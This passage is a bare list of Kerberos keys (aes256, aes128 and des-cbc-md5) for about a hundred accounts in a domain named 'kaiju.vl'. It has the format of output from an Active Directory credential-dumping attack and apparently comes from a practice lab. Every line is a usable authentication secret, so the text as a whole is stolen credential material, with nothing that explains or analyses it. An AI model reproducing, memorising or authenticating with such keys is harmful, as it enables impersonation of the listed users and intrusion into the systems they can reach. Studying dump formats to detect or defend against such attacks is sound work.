kaiju.vl\Duncan.Phillips:aes128-cts-hmac-sha1-96:3868cad927b0b0e0200d1de316be6085
kaiju.vl\Duncan.Phillips:des-cbc-md5:ae32ab64f8b31c79
kaiju.vl\Jordan.Walker:aes256-cts-hmac-sha1-96:f816eb8f592ca6cc8e4762c1fbac774aca5ed3abe7d55966c26a3eaf7fa053cf
kaiju.vl\Jordan.Walker:aes128-cts-hmac-sha1-96:05e1c9ed2ccb590e3de9baa96e36db31
kaiju.vl\Jordan.Walker:des-cbc-md5:79766b4fb085984a
kaiju.vl\Gail.Shah:aes256-cts-hmac-sha1-96:89bc6c2f278656fd74b11ca21134361496e2562913753e27db3d801143356b25
kaiju.vl\Gail.Shah:aes128-cts-hmac-sha1-96:7d82532fe1655102a1f3b59e21453a31
kaiju.vl\Gail.Shah:des-cbc-md5:b940dc62ba76d95e
kaiju.vl\Patrick.Owen:aes256-cts-hmac-sha1-96:7a34345f99c042b07b8a1219b5394927ff6d9f2b107a37654a961c3927ba6407
kaiju.vl\Patrick.Owen:aes128-cts-hmac-sha1-96:6c659aad4b2c9c3679647cec4972792c
kaiju.vl\Patrick.Owen:des-cbc-md5:62a4971ca45ba8c7
kaiju.vl\Judith.Holloway:aes256-cts-hmac-sha1-96:b531ff0b1411afeace2b69b1de67ec920e5f3ee7ec37306400531c25a60fd296
kaiju.vl\Judith.Holloway:aes128-cts-hmac-sha1-96:463f83e9e46dc375f77bb89b55bd3256
kaiju.vl\Judith.Holloway:des-cbc-md5:295d2a7cb9b6f44c
kaiju.vl\Jacob.Parry:aes256-cts-hmac-sha1-96:5a586425507d73a9c4f452f3008939928c1437ed87fe6b329259ee7ca0156b67
kaiju.vl\Jacob.Parry:aes128-cts-hmac-sha1-96:edc323829a09862b2290701e5aa4ec8b
kaiju.vl\Jacob.Parry:des-cbc-md5:9708861f52d6e634
kaiju.vl\William.Steele:aes256-cts-hmac-sha1-96:b5a713e49296bcb32bb31454085e832dbffdbb1b77537f1095ad3afad1a65102
kaiju.vl\William.Steele:aes128-cts-hmac-sha1-96:99973362d963aaa4388cf0841c323493
kaiju.vl\William.Steele:des-cbc-md5:bff2abfb0ebf46ec
kaiju.vl\Amy.Robertson:aes256-cts-hmac-sha1-96:1c633de730fcaafb7a80e5060511ac939b6b5e35e4f3291f22268c59fe6990bb
kaiju.vl\Amy.Robertson:aes128-cts-hmac-sha1-96:f7fece50aa305b424c55c13dd53b2ad3
kaiju.vl\Amy.Robertson:des-cbc-md5:62d0344561867062
kaiju.vl\Molly.Moss:aes256-cts-hmac-sha1-96:82e37fafc8cf1bad9a9a8d8de77b9b81feb3d408f0ff5e536e7b3f42eb1bd22b
kaiju.vl\Molly.Moss:aes128-cts-hmac-sha1-96:164e76c8c2ae6e00430b0e1eafbeaf89
kaiju.vl\Molly.Moss:des-cbc-md5:b5a4923b8cda97e3
kaiju.vl\Lisa.Harris:aes256-cts-hmac-sha1-96:3c6b7758002570570c862c9c13057f0f193ffa6657d1a7e81b64708e09212667
kaiju.vl\Lisa.Harris:aes128-cts-hmac-sha1-96:3a93b1c418d9d53aee9b9b494fcd056c
kaiju.vl\Lisa.Harris:des-cbc-md5:f134efa452737532
kaiju.vl\Tom.Miles:aes256-cts-hmac-sha1-96:3dd26c212923bc67eab85444e4bb572a190cc1bb3589d13cf57a1ce77f73b32f
kaiju.vl\Tom.Miles:aes128-cts-hmac-sha1-96:391a88cdd61d094a57494d1dfc1781f3
kaiju.vl\Tom.Miles:des-cbc-md5:31c1f204d3e51fe0
kaiju.vl\Jasmine.Wheeler:aes256-cts-hmac-sha1-96:13ebd1ff7c12ad69705538572311acb43f9c8ded5998f39396c598592f348a57
kaiju.vl\Jasmine.Wheeler:aes128-cts-hmac-sha1-96:f0b6b7c8fd49f2e096486ecbc5725d3b
kaiju.vl\Jasmine.Wheeler:des-cbc-md5:3132020b75a79889
kaiju.vl\Gordon.Nicholls:aes256-cts-hmac-sha1-96:fb3a68c6af67f7e707bfffcc71bd933a83d03d2fa8b47d0fe460e47e2c8ce520
kaiju.vl\Gordon.Nicholls:aes128-cts-hmac-sha1-96:d6a83d70ea7f5b6f28ac7eedfb2a8f58
kaiju.vl\Gordon.Nicholls:des-cbc-md5:eca75d32e598c47c
kaiju.vl\Joan.Wheeler:aes256-cts-hmac-sha1-96:7f3a45a3d239258ee24a8f975656307863edc0c43781d40867733d2078aebcbb
kaiju.vl\Joan.Wheeler:aes128-cts-hmac-sha1-96:63a2b9d335a63e9d0135489c99eb1a3d
kaiju.vl\Joan.Wheeler:des-cbc-md5:6edc1ce0a134314c
kaiju.vl\Edward.Weston:aes256-cts-hmac-sha1-96:bad5321e09f2f5bc35644d0f5931e319088eeef27e3df933e65c00318460ac9f
kaiju.vl\Edward.Weston:aes128-cts-hmac-sha1-96:c0dd5f1f46d17e7d72eb795928dc4c18
kaiju.vl\Edward.Weston:des-cbc-md5:3e45f2f77c46048c
kaiju.vl\Gary.Whitehouse:aes256-cts-hmac-sha1-96:a002718f54471bb0e29865445621db7ca92352180ef2fcbce6448e53cd433c54
kaiju.vl\Gary.Whitehouse:aes128-cts-hmac-sha1-96:abf08c3a159866a88a312c62175e16b5
kaiju.vl\Gary.Whitehouse:des-cbc-md5:7fb52c25effbf1ab
kaiju.vl\Keith.Harrison:aes256-cts-hmac-sha1-96:45411dc52edaf98c9690da01cc9e0890bf13b7d856a41a505dd27e038a303314
kaiju.vl\Keith.Harrison:aes128-cts-hmac-sha1-96:595981f3b915fb3437ef3dc4af2fe182
kaiju.vl\Keith.Harrison:des-cbc-md5:13ecce46867cfbcd
kaiju.vl\Janet.Howard:aes256-cts-hmac-sha1-96:5c4a0a7f75b6b6d53c5c357b4ef15f9ee856ac49b74a267e0f5eaa310c3e3072
kaiju.vl\Janet.Howard:aes128-cts-hmac-sha1-96:fd0fbd30539923c8f813076533e6d07b
kaiju.vl\Janet.Howard:des-cbc-md5:9d6d15f1fdb56de5
kaiju.vl\Lisa.Jones:aes256-cts-hmac-sha1-96:362421af58b33878dcc926883ed3f59a28542a5083f28423c043cc516f8ae734
kaiju.vl\Lisa.Jones:aes128-cts-hmac-sha1-96:04e9547744e688c8bafadc5cbefed77f
kaiju.vl\Lisa.Jones:des-cbc-md5:25ceba97a8ae5e62
kaiju.vl\Alexander.Price:aes256-cts-hmac-sha1-96:e47e831cb6cd0a059f03f1d5c3aa4511755ad97c59a0793ef562851b201d5340
kaiju.vl\Alexander.Price:aes128-cts-hmac-sha1-96:f347be494f3b9191a0c0a696622649af
kaiju.vl\Alexander.Price:des-cbc-md5:79a7bc1fad7abce6
kaiju.vl\Zoe.Robinson:aes256-cts-hmac-sha1-96:42b4ce5f943781b6e101f9ea8d6eb38f1ee3b6c03cceeee913b37f7c47dcb1c9
kaiju.vl\Zoe.Robinson:aes128-cts-hmac-sha1-96:6115358b5d24fe04d288269857268238
kaiju.vl\Zoe.Robinson:des-cbc-md5:fef49dd325e9c429
kaiju.vl\Caroline.Stevens:aes256-cts-hmac-sha1-96:50db199d9e67776b1c95a0372a8c6b5c206d15c831837bf05999af12ce8f18a6
kaiju.vl\Caroline.Stevens:aes128-cts-hmac-sha1-96:cf30dc0a66886643d06ecf60e41bbe89
kaiju.vl\Caroline.Stevens:des-cbc-md5:4689fe380270891c
kaiju.vl\Leonard.Harris:aes256-cts-hmac-sha1-96:082764fdeabb466b906d164884cc37b93047888b3b102a5c44fec0cbff352fe3
kaiju.vl\Leonard.Harris:aes128-cts-hmac-sha1-96:bfa49624cc2f803c65c3c2f8acab9ccd
kaiju.vl\Leonard.Harris:des-cbc-md5:e646ce2f237c5be5
kaiju.vl\Megan.Hall:aes256-cts-hmac-sha1-96:d9cf8a9c28bd86db4e294d2ba454c74e8824fed20e8b4e346b1bd14737dd7319
kaiju.vl\Megan.Hall:aes128-cts-hmac-sha1-96:c518086a81d06becce5ffa48e83124a0
kaiju.vl\Megan.Hall:des-cbc-md5:51c8eca2df5b4fe9
kaiju.vl\Jeremy.Curtis:aes256-cts-hmac-sha1-96:3ef52d66cc93b540f26f4ddf2f8d385240207deed42203a19654663efd7205c6
kaiju.vl\Jeremy.Curtis:aes128-cts-hmac-sha1-96:18dfc06ccf17a4aa5a3083bd29bc140d
kaiju.vl\Jeremy.Curtis:des-cbc-md5:614354ec4a6854a7
kaiju.vl\Graeme.Page:aes256-cts-hmac-sha1-96:1ad8eb3b95a37bd0f726a535bfdf69574011f9544d441185628b28c9776ae275
kaiju.vl\Graeme.Page:aes128-cts-hmac-sha1-96:ccfd00b5b5441897d0705d2ba67da2c8
kaiju.vl\Graeme.Page:des-cbc-md5:7cea01760b751332
kaiju.vl\David.Patel:aes256-cts-hmac-sha1-96:32b94dad83fd7a842c77cfb6d1b3d57032a2cfe60019bdfaecf01be759ba2268
kaiju.vl\David.Patel:aes128-cts-hmac-sha1-96:7c49ad419d1fd9d2147217fc694d5836
kaiju.vl\David.Patel:des-cbc-md5:f494045b5b4c2532
kaiju.vl\Brian.Evans:aes256-cts-hmac-sha1-96:fe6507037528477afc86e3bf34a12a723f475c0acc3c866934961073e91da81e
kaiju.vl\Brian.Evans:aes128-cts-hmac-sha1-96:258c2ca182f256636a43f80fd4e3dc85
kaiju.vl\Brian.Evans:des-cbc-md5:08cb70dc3b3d834a
kaiju.vl\Geraldine.Davis:aes256-cts-hmac-sha1-96:57f6dcb72aee4fb19ec97643be6fef1948d3cc75dd291130b4d2773a3a749e24
kaiju.vl\Geraldine.Davis:aes128-cts-hmac-sha1-96:625ed523da80832b4570b8e280b3c149
kaiju.vl\Geraldine.Davis:des-cbc-md5:98c426fe0bf267ba
kaiju.vl\Pauline.Edwards:aes256-cts-hmac-sha1-96:d4bd25b8c7338f6f75fd6a05a4ae9bafc4df4c7edff8bdc6058c99491d5fa10d
kaiju.vl\Pauline.Edwards:aes128-cts-hmac-sha1-96:904973b6e86b2984a9c3ca1ab63b3077
kaiju.vl\Pauline.Edwards:des-cbc-md5:a75e0e0137adaeef
kaiju.vl\Jeffrey.Clark:aes256-cts-hmac-sha1-96:ae9abc5b77c72f1ec48739b1de750c864bc6ae5235436baa7d62d45b66ee9633
kaiju.vl\Jeffrey.Clark:aes128-cts-hmac-sha1-96:182f5586840aa011acf3537409c81cae
kaiju.vl\Jeffrey.Clark:des-cbc-md5:d56bf76437e6bc3d
kaiju.vl\Patricia.Stone:aes256-cts-hmac-sha1-96:5c00dbaf2b5622e359eea79f297c5bffe019b3a043939dfdac3077fd925d39b4
kaiju.vl\Patricia.Stone:aes128-cts-hmac-sha1-96:8a402dee9947e5a77707274ec872f40a
kaiju.vl\Patricia.Stone:des-cbc-md5:9b0d7c315d0be01c
kaiju.vl\Joanna.Morris:aes256-cts-hmac-sha1-96:4006c4cc7801da7cbcc5191242292fecfb75a08ef6e85a11bb2d861a14fc1773
kaiju.vl\Joanna.Morris:aes128-cts-hmac-sha1-96:f86693fb5aef8cf2a01f79900d961e1e
kaiju.vl\Joanna.Morris:des-cbc-md5:5da846b64aa285ea
kaiju.vl\Ruth.Khan:aes256-cts-hmac-sha1-96:579ef279054883311be0f095d71874c731fd94a28379cf74c80982ebb673d78c
kaiju.vl\Ruth.Khan:aes128-cts-hmac-sha1-96:ea2c3f78701565abbb002bd9161cf543
kaiju.vl\Ruth.Khan:des-cbc-md5:89bc4c8fb9074fe3
kaiju.vl\Robin.Robinson:aes256-cts-hmac-sha1-96:4c7b4ae7358bb319cc8d3b613670d1ebae0e573fc33804a705b8569dd6f37db4
kaiju.vl\Robin.Robinson:aes128-cts-hmac-sha1-96:b64dc147aa249d2dbfe0895b89847095
kaiju.vl\Robin.Robinson:des-cbc-md5:e9a2df767c3838d5
kaiju.vl\Marilyn.Gibbons:aes256-cts-hmac-sha1-96:16ff1336889b3af5d0d83285896368989c749198c48dc2d8d67b524728b907f6
kaiju.vl\Marilyn.Gibbons:aes128-cts-hmac-sha1-96:7fc0ea6b395e038acc55f2788a948a2b
kaiju.vl\Marilyn.Gibbons:des-cbc-md5:5467b920f46b4025
kaiju.vl\Irene.Davies:aes256-cts-hmac-sha1-96:a19a63b22e8482393ded441c081db15753d7a80976c865a9b166dfa3c571cd69
kaiju.vl\Irene.Davies:aes128-cts-hmac-sha1-96:4f078a6d9d17d0e3b680260f94847896
kaiju.vl\Irene.Davies:des-cbc-md5:51ad94d91a944337
kaiju.vl\Ben.Bailey:aes256-cts-hmac-sha1-96:ee0f6a2d1040af17fc4e16988c8e8f0180f198e5e303923be332bfc38a756b70
kaiju.vl\Ben.Bailey:aes128-cts-hmac-sha1-96:822cda662d412cdfa289a4aeb65d4ea7
kaiju.vl\Ben.Bailey:des-cbc-md5:ae4519439b643275
kaiju.vl\Brandon.Stokes:aes256-cts-hmac-sha1-96:53ffae29486717757139b0467f4fc3b94a9866e4a8c6141e6abad31c20c07f38
kaiju.vl\Brandon.Stokes:aes128-cts-hmac-sha1-96:1b564de85b7c8f1b03625c003762c73a
kaiju.vl\Brandon.Stokes:des-cbc-md5:fe790283c45bb351
kaiju.vl\Carole.Tyler:aes256-cts-hmac-sha1-96:78a0ec502e4d5f7924478431830ccf4038cd9a20e2bd9b4b3bb75430bede3d59
kaiju.vl\Carole.Tyler:aes128-cts-hmac-sha1-96:b9963df845bcf22d9bd8c13875274b2f
kaiju.vl\Carole.Tyler:des-cbc-md5:e90bba46ce7c3df2
kaiju.vl\Jemma.Thomas:aes256-cts-hmac-sha1-96:1f0e631768e6e4975823910ffec9f79eb63c8870fd39cdf57381b303e618f994
kaiju.vl\Jemma.Thomas:aes128-cts-hmac-sha1-96:57e5f8f389c84bc27e5963103a79db69
kaiju.vl\Jemma.Thomas:des-cbc-md5:9e8fa249325ecb62
kaiju.vl\Denise.Bradley:aes256-cts-hmac-sha1-96:a73a825fc6d3e3bd4f25984ede331fdd60d3ab9f0dddfa7a257ff0c5fc047142
kaiju.vl\Denise.Bradley:aes128-cts-hmac-sha1-96:7375ba42b164b36d67cdaca41b21d6a3
kaiju.vl\Denise.Bradley:des-cbc-md5:295129a8c8b02f94
kaiju.vl\Damien.Davies:aes256-cts-hmac-sha1-96:2e78dd1ba0b980df364edf30ca1e44dca18a4b83e4fa70dcb3b61b83bd4a6c66
kaiju.vl\Damien.Davies:aes128-cts-hmac-sha1-96:32bad2a48cf816eac9cbf2b85284676d
kaiju.vl\Damien.Davies:des-cbc-md5:7fe375c10ba4a18f
kaiju.vl\Jake.King:aes256-cts-hmac-sha1-96:22bd787728e4c83ccdc90ef9f6b1a69078dc1daa10e2e1017eeb186b8ea4d5e9
kaiju.vl\Jake.King:aes128-cts-hmac-sha1-96:0cf73e97216104f6510009cc3e1df474
kaiju.vl\Jake.King:des-cbc-md5:91260262ae20b032
kaiju.vl\Eric.Jones:aes256-cts-hmac-sha1-96:810fb57e367282b8a1345ad930f4c42e8da72472aeb8339d62aa227cf07d24e5
kaiju.vl\Eric.Jones:aes128-cts-hmac-sha1-96:45f4f175519562023caf2539578d0af8
kaiju.vl\Eric.Jones:des-cbc-md5:5ef2315d38157034
kaiju.vl\Darren.Davis:aes256-cts-hmac-sha1-96:f1ec9d4c7e0d7322848c616a5b9fa858c526d1be1e1ee97733876966e2dffac8
kaiju.vl\Darren.Davis:aes128-cts-hmac-sha1-96:88419784bc4ad5509626787ab0dc6196
kaiju.vl\Darren.Davis:des-cbc-md5:1fd6c7df1994cbfb
kaiju.vl\Glen.Reynolds:aes256-cts-hmac-sha1-96:41aae1c255fc24741eb5cb8aac30c05ea7388725e979f82ae5cd1cdaf8ef8d2d
kaiju.vl\Glen.Reynolds:aes128-cts-hmac-sha1-96:8097454b115bff41c240e40266331a35
kaiju.vl\Glen.Reynolds:des-cbc-md5:07a8f8ef622f29ba
kaiju.vl\Gordon.Price:aes256-cts-hmac-sha1-96:5c4054c280ee7352b9b21e922a3060533f65751a0b3bdc6ffca2a2d2ddeeab91
kaiju.vl\Gordon.Price:aes128-cts-hmac-sha1-96:a76f058e1eccf69a7de664d9a0049af9
kaiju.vl\Gordon.Price:des-cbc-md5:fb51d6344ccbe3c1
kaiju.vl\Anna.Smith:aes256-cts-hmac-sha1-96:2cbb6ab0ebc3c63785b6c82d3037d4e5a05f6288c36225ab543d3aecea28fdda
kaiju.vl\Anna.Smith:aes128-cts-hmac-sha1-96:772edc45305694aa8186fa6075811e67
kaiju.vl\Anna.Smith:des-cbc-md5:19ec67a8c2f20bd9
kaiju.vl\Stephanie.Johnson:aes256-cts-hmac-sha1-96:b4c66b002d6fcbbbaf106f3f530a897804db0315482cc245cd29e7956d8fc0dd
kaiju.vl\Stephanie.Johnson:aes128-cts-hmac-sha1-96:7b74e51aec896ac0006095fcdcf521e4
kaiju.vl\Stephanie.Johnson:des-cbc-md5:2c62c41a15981a08
kaiju.vl\Robert.Whittaker:aes256-cts-hmac-sha1-96:19a264f5e9f6e128186cd3b0f45d1e8e4628ca1451eaedb2ca75129826989d91
kaiju.vl\Robert.Whittaker:aes128-cts-hmac-sha1-96:2c861e56d3fa5cb8fcdf460361ac80ac
kaiju.vl\Robert.Whittaker:des-cbc-md5:ef083d103286864f
kaiju.vl\Deborah.Gray:aes256-cts-hmac-sha1-96:9c027749c4c3874d9c2d0692da2f3142c013a74342983e5a7c6b96086fa144f9
kaiju.vl\Deborah.Gray:aes128-cts-hmac-sha1-96:7920d4aee238c70afc746f4fd34e3573
kaiju.vl\Deborah.Gray:des-cbc-md5:b920070ef8384c08
kaiju.vl\Darren.Stevens:aes256-cts-hmac-sha1-96:4255f06825b987edee285bd862bd737a35020a03d4347daa378fdb25f8e8801e
kaiju.vl\Darren.Stevens:aes128-cts-hmac-sha1-96:9c5f914310d2d0dacfc4b663ec2f9050
kaiju.vl\Darren.Stevens:des-cbc-md5:b0ec406294fbad8a
kaiju.vl\Howard.Armstrong:aes256-cts-hmac-sha1-96:16828eec18731f8611e39e24273b7aba8d4d36720c8cc7afc8831efa29c705d4
kaiju.vl\Howard.Armstrong:aes128-cts-hmac-sha1-96:f761cc61f2dc673a4c90429748788429
kaiju.vl\Howard.Armstrong:des-cbc-md5:97b0c8f84a10e6fd
kaiju.vl\Jonathan.Kelly:aes256-cts-hmac-sha1-96:dcdb2042469bdc7d46ea53167031017ab8c51f064f5af3a5b97e74dda0731096
kaiju.vl\Jonathan.Kelly:aes128-cts-hmac-sha1-96:3fa1c2336793a15ac1870ea9afbbebef
kaiju.vl\Jonathan.Kelly:des-cbc-md5:e9893e6e382ae607
kaiju.vl\Peter.Charlton:aes256-cts-hmac-sha1-96:387742ee9330811aa3b28e7adfac69121f3a9284499c12e29b8c28ac915e1fc7
kaiju.vl\Peter.Charlton:aes128-cts-hmac-sha1-96:1b2391ac8f6d5be6da494c137b47a719
kaiju.vl\Peter.Charlton:des-cbc-md5:3729a7406b156b46
kaiju.vl\Tony.Elliott:aes256-cts-hmac-sha1-96:0faf18110b6c0855c3a89564a2de76e128f2eadff1fe2041e05d1d37a8246e9f
kaiju.vl\Tony.Elliott:aes128-cts-hmac-sha1-96:1343e909b9fc28d9f455cf0abdbb95f0
kaiju.vl\Tony.Elliott:des-cbc-md5:fd13bcb9bcdf70d9
kaiju.vl\Megan.Cook:aes256-cts-hmac-sha1-96:84a4373b6153fb599fca9357accf60facedb9098a785da31ea9ec27fed5c4416
kaiju.vl\Megan.Cook:aes128-cts-hmac-sha1-96:ebebf582acfb378a3961698f23fb8fba
kaiju.vl\Megan.Cook:des-cbc-md5:1583e56b613b3e01
kaiju.vl\Samuel.Evans:aes256-cts-hmac-sha1-96:20b2866e9a2ecbe2c50cd2161852e56675370a1cfd03bf4c0613f3ca8c29f5bc
kaiju.vl\Samuel.Evans:aes128-cts-hmac-sha1-96:50d5264a8c78fff5db772b1c9baab304
kaiju.vl\Samuel.Evans:des-cbc-md5:a1640207d573407a
kaiju.vl\Arthur.Powell:aes256-cts-hmac-sha1-96:fec0891730823ab666895bd9fe9a478e5f7dec43319c1eb6f62aceb181ae3647
kaiju.vl\Arthur.Powell:aes128-cts-hmac-sha1-96:92e2eaf0c15931a746354370d13484da
kaiju.vl\Arthur.Powell:des-cbc-md5:64ef62b03401b62f
kaiju.vl\Kyle.Smith:aes256-cts-hmac-sha1-96:20e070d9798f6011612f3086137849c5bd84dd0c7da6f9931ce2c5d14d3add7d
kaiju.vl\Kyle.Smith:aes128-cts-hmac-sha1-96:e9f2a9646d590123cfda10c9cec3fcfb
kaiju.vl\Kyle.Smith:des-cbc-md5:910b20809dbf2052
kaiju.vl\Denise.Atkinson:aes256-cts-hmac-sha1-96:7e9a2feb67913dbbab228bb4dc0f5283e186543c9f6f4e8665e4ea90093e1ddb
kaiju.vl\Denise.Atkinson:aes128-cts-hmac-sha1-96:23c8893c8acad489a7123c58c9ad4f2a
kaiju.vl\Denise.Atkinson:des-cbc-md5:dfb9cb0816d0ad2c
kaiju.vl\Emma.Spencer:aes256-cts-hmac-sha1-96:2c041d54c2bc7d44854ec06ce5eed413997f1511bd216ff29dd3945a6852d7c0
kaiju.vl\Emma.Spencer:aes128-cts-hmac-sha1-96:692a9d66ae14a9cac5f992e8660e6480
kaiju.vl\Emma.Spencer:des-cbc-md5:37bfb9614fa84689
kaiju.vl\Arthur.Stone:aes256-cts-hmac-sha1-96:a41019f757c0f0c30c1ca35700b154427b936b703be25624f012ac3bcae8030f
kaiju.vl\Arthur.Stone:aes128-cts-hmac-sha1-96:0edafd89d562348f15a16b902f22761c
kaiju.vl\Arthur.Stone:des-cbc-md5:4cb3b3a1b5382a91
kaiju.vl\David.Rose:aes256-cts-hmac-sha1-96:8ca3031fcf1137456e25c3bb089a923cf67b3293f93cb8d1fa7f2d8452c4181d
kaiju.vl\David.Rose:aes128-cts-hmac-sha1-96:5892b98ab8a99bdfcff6091d7d01f23a
kaiju.vl\David.Rose:des-cbc-md5:ae9443080df84529
kaiju.vl\Kerry.Campbell:aes256-cts-hmac-sha1-96:68b3ab127ed29b0182d5e8ac6739c7f8bc92c860fefc5f533bce699f4b834ef1
kaiju.vl\Kerry.Campbell:aes128-cts-hmac-sha1-96:a8bd2421759e4960a83f442864bd4fc6
kaiju.vl\Kerry.Campbell:des-cbc-md5:c81f072ac4fb262c
kaiju.vl\Adrian.Harris:aes256-cts-hmac-sha1-96:f0546cab45642aca806051d2ac6ba157aa1d704e6d35ad0d1ddaff16c4f35018
kaiju.vl\Adrian.Harris:aes128-cts-hmac-sha1-96:9bb7b7fd74175a91a43735e4b7462846
kaiju.vl\Adrian.Harris:des-cbc-md5:c7325b80b07c68d3
kaiju.vl\Vincent.Palmer:aes256-cts-hmac-sha1-96:c37711c07f692709a6455a41ffe32ac38d4d6e3d3a26e30addbb2e6b2551da34
kaiju.vl\Vincent.Palmer:aes128-cts-hmac-sha1-96:047a42b11d52bb7ce60684783d887d63
kaiju.vl\Vincent.Palmer:des-cbc-md5:2970f10defe65b73
kaiju.vl\Amanda.White:aes256-cts-hmac-sha1-96:664f1289fd17e6ff308948d45c9b3395eb6b1218e7d9060b3716889f98cd4802
kaiju.vl\Amanda.White:aes128-cts-hmac-sha1-96:8420b0b860f6ff547c4c991d111f315a
kaiju.vl\Amanda.White:des-cbc-md5:1510bcd3159e1aab
kaiju.vl\Mitchell.Jones:aes256-cts-hmac-sha1-96:20f6ee520bb8d979e718a0ff786c8daa7d8cae5a1bfc5869caacbdc69164b47c
kaiju.vl\Mitchell.Jones:aes128-cts-hmac-sha1-96:818b3ef32ffa5ceeb6decaeb9bfea848
kaiju.vl\Mitchell.Jones:des-cbc-md5:6e5dea08c2384675
kaiju.vl\Jean.Shepherd:aes256-cts-hmac-sha1-96:0d5bb595e22a5ea4d94736358fd44d7414f2ddccc285b2b4fd964e1377c4505e
kaiju.vl\Jean.Shepherd:aes128-cts-hmac-sha1-96:77991009531c94a2fa033b8ff82a6571
kaiju.vl\Jean.Shepherd:des-cbc-md5:8c7c40649d26547a
kaiju.vl\Lewis.Johnston:aes256-cts-hmac-sha1-96:a7550acc3423629a9fd70b846aed32262bc4b241408060ed263ccad2e04b5401
kaiju.vl\Lewis.Johnston:aes128-cts-hmac-sha1-96:a597ef2c13435a783883a444fc7c363f
kaiju.vl\Lewis.Johnston:des-cbc-md5:7c86450de0510d46
kaiju.vl\Reece.Owen:aes256-cts-hmac-sha1-96:58969c3e72cab8db4eb0824dd28319cef0aee5f8243ffe70d277b1d0255cfdad
kaiju.vl\Reece.Owen:aes128-cts-hmac-sha1-96:47df9e1c8297790989f5e3568ba6f97e
kaiju.vl\Reece.Owen:des-cbc-md5:e6583ee392408025
kaiju.vl\Adam.Randall:aes256-cts-hmac-sha1-96:4007cd7b07e79a709a3a6a4d79060d87459811e55f4a6bf9ae07f01a1c972fb3
kaiju.vl\Adam.Randall:aes128-cts-hmac-sha1-96:30d5472428231ebfabfcf7e5a56898ae
kaiju.vl\Adam.Randall:des-cbc-md5:73629d1ac102430b
kaiju.vl\Kimberley.Willis:aes256-cts-hmac-sha1-96:a33fc53607a2c79b2c3360395479a130957b9a215f1a9c146cb0ed90e40c9067
kaiju.vl\Kimberley.Willis:aes128-cts-hmac-sha1-96:2d753b888a33c56d6eca34d9016db59d
kaiju.vl\Kimberley.Willis:des-cbc-md5:75d6fd0ecb7362dc
kaiju.vl\Raymond.Howard:aes256-cts-hmac-sha1-96:b02dbac7653b24b7633107ce61cd17bbcdbee9ee4790a0d6318ef5c8a0bc4643
kaiju.vl\Raymond.Howard:aes128-cts-hmac-sha1-96:c9a77f4324ed6012a43e83d41e41ca20
kaiju.vl\Raymond.Howard:des-cbc-md5:7fa137ce851fabb3
kaiju.vl\Conor.Price:aes256-cts-hmac-sha1-96:5d9b804980d72eec7335baa509b39597a3ddc097b6cdcf71e1704f67f3500fc8
kaiju.vl\Conor.Price:aes128-cts-hmac-sha1-96:ba2bac3378bcb7783acb7b54af8f0242
kaiju.vl\Conor.Price:des-cbc-md5:8f1a6401f11c13e3
kaiju.vl\Claire.Whitehead:aes256-cts-hmac-sha1-96:e8192aa210ca8bb2b07cfeaf91d8599e5eb4880c66db81ba820650a0ab6bf3a2
kaiju.vl\Claire.Whitehead:aes128-cts-hmac-sha1-96:3f1f9bed390f36d765346988eb27393f
kaiju.vl\Claire.Whitehead:des-cbc-md5:29b01c5170324aa8
kaiju.vl\Jacob.Coates:aes256-cts-hmac-sha1-96:e49e7a5270590e8b2f5e1a9cc96a5ff47635783e49ee7b1586ee3b3bcaac555b
kaiju.vl\Jacob.Coates:aes128-cts-hmac-sha1-96:5bc09fc252f61100bf07a3491a4426b7
kaiju.vl\Jacob.Coates:des-cbc-md5:7301d3670416ea64
kaiju.vl\Frances.Jordan:aes256-cts-hmac-sha1-96:e02ed488530a6f10d5eee23a72e16762137a59f2a77bee689a5678a1e6c928b8
kaiju.vl\Frances.Jordan:aes128-cts-hmac-sha1-96:05fe5d62c69c0f236c36f9c142aa78df
kaiju.vl\Frances.Jordan:des-cbc-md5:d5253880c267c28a
kaiju.vl\Rhys.Bowen:aes256-cts-hmac-sha1-96:82e0d4fa49ea3e9359daad53bc96316d00ff67fac3d0c83c71d282c39c0c379d
kaiju.vl\Rhys.Bowen:aes128-cts-hmac-sha1-96:87d9f7f780d5d692ec28442ee1554be9
kaiju.vl\Rhys.Bowen:des-cbc-md5:9819c1efda854fcb
kaiju.vl\Nicole.Jones:aes256-cts-hmac-sha1-96:8010c70b0cc7b6d13651841ed19ee9ac70d20942d5bd47ba2ec85696a4b1aeab
kaiju.vl\Nicole.Jones:aes128-cts-hmac-sha1-96:2cd15ab35d8ddb36cb96c5d12bd47430
kaiju.vl\Nicole.Jones:des-cbc-md5:8379682fa1100dd3
kaiju.vl\Sally.Dennis:aes256-cts-hmac-sha1-96:937b9474fe5d3d8a9c7ee7e5558b9417ef1b0aa1ecfb14cd17fd9f89b013cb44
kaiju.vl\Sally.Dennis:aes128-cts-hmac-sha1-96:67875c09985931cfcccb166aabe1e667
kaiju.vl\Sally.Dennis:des-cbc-md5:8fd694f131791354
kaiju.vl\Russell.Bell:aes256-cts-hmac-sha1-96:ecd29d89fd5b785a0105db942c681d7effabab63a5bead51481cef1efbfa7321
kaiju.vl\Russell.Bell:aes128-cts-hmac-sha1-96:b13cef3fcfb3de3e776df083fc28368c
kaiju.vl\Russell.Bell:des-cbc-md5:31455275ef38ab10
kaiju.vl\Kevin.Smith:aes256-cts-hmac-sha1-96:ebe65db33626288b23a182809a7b2378104dab80336aa85e547d297c2e7d162a
kaiju.vl\Kevin.Smith:aes128-cts-hmac-sha1-96:8ef2504a84c7f5acee58e3ad635b7585
kaiju.vl\Kevin.Smith:des-cbc-md5:cef24058bc2f8a49
kaiju.vl\Brian.Campbell:aes256-cts-hmac-sha1-96:1cf35ceca434218af22500dcdc6d78d70eab4bf117be0a3efb0c23bfd26bcd11
kaiju.vl\Brian.Campbell:aes128-cts-hmac-sha1-96:c402328d11b5eb9cff3054a070c867ed
kaiju.vl\Brian.Campbell:des-cbc-md5:106d314938dc1631
kaiju.vl\Rachael.Dickinson:aes256-cts-hmac-sha1-96:a64415fdd1679f713ad6536e7a16d6e288341479e839034445fb354129f7095d
kaiju.vl\Rachael.Dickinson:aes128-cts-hmac-sha1-96:c6fe61642fe4546fd0b76f35413c6de0
kaiju.vl\Rachael.Dickinson:des-cbc-md5:ab2cae5704738c6d
kaiju.vl\Gemma.Hunter:aes256-cts-hmac-sha1-96:e32a6bf440a0d68d6a5121b97fb5f47cdd3704ccbf990ce55d3dc6d1bc7462d1
kaiju.vl\Gemma.Hunter:aes128-cts-hmac-sha1-96:df9bca7b12b135130aef88edf85eb258
kaiju.vl\Gemma.Hunter:des-cbc-md5:51a46bd90d297f98
